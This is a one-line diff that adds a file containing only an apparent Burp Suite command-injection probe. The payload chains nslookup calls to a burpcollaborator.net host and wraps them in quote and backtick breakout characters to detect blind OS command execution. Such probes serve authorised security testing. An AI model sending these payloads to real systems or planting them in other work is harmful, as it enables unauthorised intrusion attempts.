@@ -1,0 +1,1 @@
+8lreM0B9Hm&nslookup -q=cname aiwe3vy4qx94qvyr7c5obhqgx730rynmiaax3ls.burpcollaborator.net.&'\"`0&nslookup -q=cname aiwe3vy4qx94qvyr7c5obhqgx730rynmiaax3ls.burpcollaborator.net.&`'
